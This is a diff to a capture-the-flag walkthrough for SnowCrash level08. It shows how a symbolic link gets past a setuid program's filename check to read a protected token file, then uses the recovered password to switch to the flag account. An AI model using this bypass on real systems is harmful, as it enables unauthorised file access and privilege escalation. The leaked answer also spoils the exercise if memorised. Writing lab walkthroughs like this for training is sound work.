@@ -1,7 +1,6 @@
 # Level08
 
 ## Research
-------------------
 
 ```bash
 level08@SnowCrash:~$ ls -l
@@ -40,10 +39,9 @@ You may not access '/tmp/cctoken'
 ```
 The theory seems true: the program will open, read and print anyfile which doesn't have token in its name.
 
-- How to make it access and read `token` through a file not named 'token'?
+How to make it access and read `token` through a file not named 'token'?
 
 ## Solution
-------------------
 
 https://techterms.com/definition/symbolic_link
 
@@ -52,5 +50,13 @@ We can use symbolic links: </br>
 ```bash
 level08@SnowCrash:~$ ln -s ~/token /tmp/link
 level08@SnowCrash:~$ ./level08 /tmp/link
+quif5eloekouj29ke0vouxean
 ```
-gives the token.
+And then connect to flag08 using `quif5eloekouj29ke0vouxean`
+```bash
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXX
+```
